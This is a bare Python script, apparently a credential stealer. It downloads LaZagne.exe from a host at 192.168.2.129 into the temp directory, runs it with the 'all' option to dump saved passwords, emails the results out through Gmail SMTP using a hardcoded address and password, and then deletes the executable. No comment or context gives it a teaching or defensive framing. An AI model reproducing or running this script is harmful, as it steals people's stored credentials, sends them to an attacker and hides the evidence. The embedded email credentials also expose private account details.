import tempfile
import requests
import smtplib
import subprocess
import os


def download(url):
    response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as f:
        f.write(response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://192.168.2.129/files/LaZagne.exe")

command = 'LaZagne.exe all'
result = subprocess.check_output(command, shell=True)
send_mail('zilolayakubova.zy@gmail.com', 'uaxdgdqzparjqfag', result)
os.remove("LaZagne.exe")
